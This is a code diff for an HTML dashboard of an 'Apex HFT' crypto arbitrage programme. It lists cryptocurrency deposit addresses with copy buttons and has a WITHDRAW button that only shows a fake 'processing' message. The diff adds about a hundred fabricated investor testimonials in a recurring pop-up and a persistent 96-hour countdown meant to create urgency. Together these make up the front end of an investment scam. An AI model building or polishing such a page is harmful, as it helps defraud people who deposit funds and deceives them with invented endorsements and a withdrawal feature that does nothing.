@@ -8,18 +8,39 @@
     <style>
         @keyframes scroll { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
         .ticker-animate { animation: scroll 20s linear infinite; }
+        body { background-color: #030712; color: #ffffff; }
     </style>
 </head>
-<body class="bg-gray-950 text-white min-h-screen p-4 md:p-8">
+<body class="min-h-screen p-4 md:p-8">
 
-    <!-- Ticker -->
-    <div class="overflow-hidden bg-blue-900/30 py-2 mb-8 rounded-lg border border-blue-800">
+    <!-- Header -->
+    <header class="max-w-4xl mx-auto mb-8 border-b border-gray-800 pb-4">
+        <h1 class="text-2xl font-bold text-blue-400">Investment Dashboard</h1>
+    </header>
+
+    <!-- Ticker Tape -->
+    <div class="max-w-4xl mx-auto overflow-hidden bg-gray-900 py-2 mb-8 rounded-lg border border-gray-800">
         <div class="ticker-animate whitespace-nowrap text-blue-300 font-semibold">
             Thank you for joining our arbitrage program.
         </div>
     </div>
 
-    <div class="max-w-4xl mx-auto">
+    <main class="max-w-4xl mx-auto">
+        <!-- Profile Header -->
+        <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800 mb-8 grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div>
+                <h1 class="text-3xl font-bold">Tempo</h1>
+                <div class="mt-2 space-y-1 text-gray-400 text-sm">
+                    <p>Email: tempo@hft-services.com</p>
+                    <p>Phone: +1 (555) 019-8765</p>
+                </div>
+            </div>
+            <div class="bg-black p-3 rounded-lg text-xs break-all border border-gray-800">
+                <span class="text-gray-500">Withdrawal Address:</span><br>
+                fiiwwyqqoiwjjjzijz
+            </div>
+        </div>
+
         <!-- Stats Row -->
         <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
             <div class="bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
@@ -32,7 +53,7 @@
             </div>
             <div class="col-span-2 bg-gray-900 p-4 rounded-xl border border-gray-800 text-center">
                 <div class="text-xs text-gray-500 uppercase">Cycle Countdown</div>
-                <div id="countdown" class="text-xl font-mono font-bold text-yellow-400">72:00:00</div>
+                <div id="countdown" class="text-xl font-mono font-bold text-yellow-400">96:00:00</div>
             </div>
         </div>
 
@@ -43,7 +64,7 @@
 
         <!-- Withdraw Button -->
         <div class="my-12 text-center">
-            <button onclick="showModal()" class="bg-blue-600 hover:bg-blue-500 transition px-12 py-6 rounded-2xl text-2xl font-bold w-full md:w-auto shadow-lg shadow-blue-900/20">
+            <button onclick="showModal('modal-withdraw')" class="bg-blue-600 hover:bg-blue-500 transition px-12 py-6 rounded-2xl text-2xl font-bold w-full md:w-auto shadow-lg shadow-blue-900/20">
                 WITHDRAW
             </button>
         </div>
@@ -51,23 +72,140 @@
         <!-- Deposit Section -->
         <div class="bg-gray-900 p-6 rounded-2xl border border-gray-800">
             <h2 class="text-xl font-semibold mb-6">Deposit Addresses</h2>
-            <div class="space-y-4" id="address-list">
-                <!-- BTC, SOL, BNB, USDT, ETH -->
-            </div>
+            <div class="space-y-4" id="address-list"></div>
         </div>
-    </div>
+    </main>
 
-    <!-- Modal -->
-    <div id="modal" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4">
+    <!-- Footer -->
+    <footer class="max-w-4xl mx-auto mt-12 p-6 text-center text-gray-600 text-sm border-t border-gray-800">
+        &copy; 2026 All Rights Reserved Apex HFT
+    </footer>
+
+    <!-- Withdraw Modal -->
+    <div id="modal-withdraw" class="hidden fixed inset-0 bg-black/80 flex items-center justify-center p-4 z-50">
         <div class="bg-gray-900 p-8 rounded-2xl border border-gray-700 max-w-sm text-center">
             <h3 class="text-xl font-bold mb-4">Processing</h3>
             <p class="text-gray-400 mb-6">Request processing... Please check your email for confirmation.</p>
-            <button onclick="hideModal()" class="bg-blue-600 px-6 py-2 rounded-lg">Close</button>
+            <button onclick="hideModal('modal-withdraw')" class="bg-blue-600 px-6 py-2 rounded-lg text-white">Close</button>
         </div>
+    </div>
+
+    <!-- Testimonial Overlay -->
+    <div id="testimonial-overlay" class="hidden fixed bottom-8 right-8 max-w-sm bg-gray-900 border border-blue-500 p-6 rounded-2xl shadow-2xl z-40">
+        <button onclick="hideModal('testimonial-overlay')" class="absolute top-2 right-2 text-gray-500 hover:text-white">✕</button>
+        <p id="testimonial-text" class="text-gray-300 italic mb-4"></p>
+        <p id="testimonial-name" class="font-bold text-blue-400"></p>
     </div>
 
     <script>
         let previousPrices = {};
+        
+        // Load persistent state for Testimonials
+        let testimonialIndex = parseInt(localStorage.getItem('apex_testimonial_index') || "0");
+        
+        const testimonials = [
+            { name: "Sarah Chen", text: "Finally a platform that actually delivers. Made my first $2,400 in 3 days with zero stress." },
+            { name: "Michael Torres", text: "The arbitrage engine is insane. So simple yet so profitable. Loving this project!" },
+            { name: "Aisha Rahman", text: "I’ve never seen money come in this consistently. Apex is legit." },
+            { name: "David Okon", text: "Easiest earnings I’ve ever made. The system does all the work." },
+            { name: "Rachel Kim", text: "I love how transparent and smooth everything is. Already recommending to friends." },
+            { name: "Jamal Wright", text: "Arbitrage has never been this easy. Apex changed the game for me." },
+            { name: "Priya Sharma", text: "Just hit my first $10k. Can’t believe how effortless it feels." },
+            { name: "Carlos Mendoza", text: "This is the real deal. Fast payouts and consistent profits." },
+            { name: "Fatima Adebayo", text: "I was skeptical at first, but the results speak for themselves." },
+            { name: "Kevin Zhang", text: "Best investment decision I’ve made this year. Thank you Apex!" },
+            { name: "Nadia Petrova", text: "The engine runs 24/7 and so does my profit. Incredible." },
+            { name: "Marcus Okoro", text: "Simple setup, massive returns. I’m truly impressed." },
+            { name: "Elena Rodriguez", text: "I love this arbitrage system. It actually works!" },
+            { name: "Solomon Adeyemi", text: "Been running for 2 weeks and already in profit. Legit platform." },
+            { name: "Jessica Wong", text: "So glad I joined. Earning while I sleep is a dream come true." },
+            { name: "Ahmed Khalil", text: "Apex HFT is the smartest move I’ve made in crypto." },
+            { name: "Linda Moreau", text: "Super clean interface and even better results." },
+            { name: "Chinedu Eze", text: "The profits are real. I check my wallet and smile every day." },
+            { name: "Sophia Laurent", text: "Finally found a platform I can trust. Highly recommended." },
+            { name: "Robert Kimani", text: "This arbitrage engine is pure genius. Loving every second." },
+            { name: "Emma Thompson", text: "Easy money with zero headaches. Apex is amazing." },
+            { name: "Taiwo Adewale", text: "I’ve made more in 10 days than my salary last month." },
+            { name: "Olivia Santos", text: "Love the technology behind this. Truly next level." },
+            { name: "Ibrahim Khan", text: "Payouts are fast and consistent. Very satisfied." },
+            { name: "Grace Lee", text: "Best arbitrage platform I’ve ever used. Period." },
+            { name: "Daniel Okafor", text: "I tell everyone about Apex. It just works." },
+            { name: "Maya Patel", text: "Super smooth and profitable. I’m hooked!" },
+            { name: "Joseph Mensah", text: "The engine is a money printer. Thank you!" },
+            { name: "Isabella Rossi", text: "So easy even my mom could use it." },
+            { name: "Victor Okeke", text: "Real results, real profits. Loving it." },
+            { name: "Zara Ahmed", text: "This changed my financial life for good." },
+            { name: "Henry Dubois", text: "Arbitrage made simple and highly rewarding." },
+            { name: "Amina Diallo", text: "I sleep better knowing my money is working." },
+            { name: "Samuel Green", text: "Apex delivers exactly what they promise." },
+            { name: "Layla Hassan", text: "Best decision I made in 2026." },
+            { name: "Noah Schmidt", text: "Profits every single day. Unreal." },
+            { name: "Sofia Morales", text: "I love how reliable this platform is." },
+            { name: "Kwame Boateng", text: "Finally a system that doesn’t disappoint." },
+            { name: "Amelia Chen", text: "Super clean and super profitable." },
+            { name: "Ethan Moreau", text: "Made back my investment in 4 days." },
+            { name: "Fatima Bello", text: "This is how investing should be." },
+            { name: "Lucas Moreau", text: "I’m genuinely impressed with the results." },
+            { name: "Nia Okoro", text: "Arbitrage has never been this fun." },
+            { name: "James Leclerc", text: "Fast, reliable, and very profitable." },
+            { name: "Zara Khan", text: "I can’t stop smiling when I check my balance." },
+            { name: "Malik Johnson", text: "Apex is built different. Truly." },
+            { name: "Elena Petrova", text: "The returns are consistent and impressive." },
+            { name: "Diego Silva", text: "Loving the passive income stream." },
+            { name: "Priya Nair", text: "So glad I found this gem." },
+            { name: "Anthony Osei", text: "This engine is a beast. Well done!" },
+            { name: "Sophia Wang", text: "Easiest profits I’ve ever made." },
+            { name: "Jamal Adeyemi", text: "Apex is changing lives one trade at a time." },
+            { name: "Isabella Costa", text: "Very professional and highly effective." },
+            { name: "Michael Adebayo", text: "I trust this platform 100%." },
+            { name: "Layla Thompson", text: "The results keep getting better." },
+            { name: "Omar Farouk", text: "Simple, clean, and very rewarding." },
+            { name: "Rachel Dubois", text: "I love everything about Apex HFT." },
+            { name: "David Mensah", text: "Best arbitrage experience ever." },
+            { name: "Aisha Mohammed", text: "Profits are rolling in nicely." },
+            { name: "Kevin Okafor", text: "This is the future of investing." },
+            { name: "Maya Rodriguez", text: "Super reliable and user-friendly." },
+            { name: "Solomon Khan", text: "Made $8k in my first two weeks." },
+            { name: "Emma Leclerc", text: "I’m a believer now." },
+            { name: "Chinedu Okeke", text: "The engine never sleeps and neither do my gains." },
+            { name: "Zara Patel", text: "Extremely satisfied with my returns." },
+            { name: "Lucas Adewale", text: "This platform is pure gold." },
+            { name: "Fatima Wong", text: "So easy and so effective." },
+            { name: "Henry Kim", text: "Best investment I’ve made." },
+            { name: "Nia Santos", text: "I recommend Apex to everyone." },
+            { name: "Joseph Chen", text: "The profits feel almost too good." },
+            { name: "Sophia Okoro", text: "Apex makes arbitrage look easy." },
+            { name: "Ahmed Bello", text: "Very transparent and trustworthy." },
+            { name: "Olivia Mensah", text: "My portfolio has never looked better." },
+            { name: "Taiwo Green", text: "I’m truly grateful I joined." },
+            { name: "Layla Silva", text: "This is the real deal." },
+            { name: "Marcus Khan", text: "Fast setup, faster profits." },
+            { name: "Priya Osei", text: "Loving the daily earnings." },
+            { name: "Ethan Diallo", text: "Apex exceeded all my expectations." },
+            { name: "Amina Rossi", text: "So smooth and stress-free." },
+            { name: "Samuel Kimani", text: "This is financial freedom." },
+            { name: "Grace Moreau", text: "I check my wallet and just smile." },
+            { name: "Victor Laurent", text: "Arbitrage done right." },
+            { name: "Zara Okon", text: "Extremely happy with my results." },
+            { name: "Daniel Hassan", text: "Apex is a game changer." },
+            { name: "Maya Adebayo", text: "Best platform hands down." },
+            { name: "Kwame Wright", text: "Profits are consistent and growing." },
+            { name: "Isabella Okeke", text: "I love this project so much." },
+            { name: "Noah Patel", text: "Super clean and super profitable." },
+            { name: "Rachel Khan", text: "This is how real money is made." },
+            { name: "James Adeyemi", text: "Apex never disappoints." },
+            { name: "Fatima Leclerc", text: "I feel so lucky to have found this." },
+            { name: "Malik Santos", text: "The engine is incredibly powerful." },
+            { name: "Sophia Okafor", text: "Easiest money I’ve ever earned." },
+            { name: "Lucas Bello", text: "Very impressed with the performance." },
+            { name: "Aisha Moreau", text: "Apex is my new favorite platform." },
+            { name: "Henry Kim", text: "Results are better than I expected." },
+            { name: "Zara Mensah", text: "I’m officially a fan." },
+            { name: "David Costa", text: "This is the smartest move I’ve made." },
+            { name: "Emma Adewale", text: "Loving every profit that comes in." },
+            { name: "Chinedu Thompson", text: "Apex HFT is the future. Period." }
+        ];
+
         const assets = [
             { id: 'btc', name: 'BTC', addr: 'bc1q3ucw3ddh8cszq63n5nesghnyluc2gkrsnq39ws' },
             { id: 'sol', name: 'SOL', addr: '8jVF1ZxNK3RD96BazJDQqvJWYMWi3WJ5U3ESSt4hUXBc' },
@@ -76,11 +214,11 @@
             { id: 'eth', name: 'ETH', addr: '0xA18d7A53655f5fa110dd7D17A33FA1Ff8fc2Ef55' }
         ];
 
-        // Render Addresses
+        // Setup addresses
         const list = document.getElementById('address-list');
         assets.forEach(a => {
             list.innerHTML += `
-                <div class="flex justify-between items-center p-4 bg-gray-950 rounded-lg border border-gray-800">
+                <div class="flex justify-between items-center p-4 bg-black rounded-lg border border-gray-800">
                     <div><span class="font-bold">${a.name}:</span> <span class="text-sm font-mono text-gray-400 break-all ml-2" id="${a.id}">${a.addr}</span></div>
                     <button onclick="copy('${a.id}')" class="bg-gray-800 px-3 py-1 rounded hover:bg-gray-700 text-sm transition" id="btn-${a.id}">Copy</button>
                 </div>`;
@@ -88,7 +226,7 @@
 
         async function fetchPrices() {
             try {
-                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,solana,binancecoin,ethereum,tether&vs_currencies=usd');
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,solana,binancecoin,ethereum&vs_currencies=usd');
                 const data = await res.json();
                 const map = { bitcoin: 'BTC', solana: 'SOL', binancecoin: 'BNB', ethereum: 'ETH' };
                 const container = document.getElementById('price-card');
@@ -104,34 +242,73 @@
                         </div>`;
                     previousPrices[key] = price;
                 });
-            } catch (e) { console.error(e); }
+            } catch (e) { console.error("API Limit reached - ignoring."); }
         }
 
         function copy(id) {
             const text = document.getElementById(id).innerText;
-            navigator.clipboard.writeText(text);
+            const textarea = document.createElement("textarea");
+            textarea.value = text;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand("copy");
+            document.body.removeChild(textarea);
+            
             const btn = document.getElementById('btn-' + id);
             btn.innerText = 'Copied!';
             btn.classList.add('bg-green-800');
             setTimeout(() => { btn.innerText = 'Copy'; btn.classList.remove('bg-green-800'); }, 2000);
         }
 
-        // Countdown
-        let time = 72 * 60 * 60;
-        function updateCountdown() {
-            const h = Math.floor(time / 3600);
-            const m = Math.floor((time % 3600) / 60);
-            const s = time % 60;
-            document.getElementById('countdown').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-            if(time > 0) time--;
+        function showModal(id) { document.getElementById(id).classList.remove('hidden'); }
+        function hideModal(id) { document.getElementById(id).classList.add('hidden'); }
+
+        // Updated Testimonial Logic
+        function showTestimonial() {
+            const t = testimonials[testimonialIndex];
+            document.getElementById('testimonial-text').innerText = `"${t.text}"`;
+            document.getElementById('testimonial-name').innerText = `- ${t.name}`;
+            document.getElementById('testimonial-overlay').classList.remove('hidden');
+            
+            // Auto-hide after 5 minutes
+            setTimeout(() => { document.getElementById('testimonial-overlay').classList.add('hidden'); }, 300000);
+            
+            // Advance index and save state
+            testimonialIndex = (testimonialIndex + 1) % testimonials.length;
+            localStorage.setItem('apex_testimonial_index', testimonialIndex);
+            localStorage.setItem('apex_testimonial_last_time', Date.now());
         }
 
-        function showModal() { document.getElementById('modal').classList.remove('hidden'); }
-        function hideModal() { document.getElementById('modal').classList.add('hidden'); }
+        function checkTestimonialTrigger() {
+            const lastTime = localStorage.getItem('apex_testimonial_last_time');
+            if (!lastTime || (Date.now() - parseInt(lastTime) >= 7200000)) {
+                showTestimonial();
+            }
+        }
+
+        // Countdown Logic (Persistence-aware)
+        let endTime = localStorage.getItem('apex_countdown_end');
+        if (!endTime) {
+            endTime = Date.now() + (96 * 60 * 60 * 1000);
+            localStorage.setItem('apex_countdown_end', endTime);
+        }
+
+        function updateCountdown() {
+            const now = Date.now();
+            const remaining = Math.max(0, endTime - now);
+            const h = Math.floor(remaining / 3600000);
+            const m = Math.floor((remaining % 3600000) / 60000);
+            const s = Math.floor((remaining % 60000) / 1000);
+            document.getElementById('countdown').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+        }
 
         setInterval(fetchPrices, 10000);
         setInterval(updateCountdown, 1000);
+        setInterval(checkTestimonialTrigger, 60000); // Check every minute
+        
         fetchPrices();
+        updateCountdown();
+        checkTestimonialTrigger();
     </script>
 </body>
 </html>
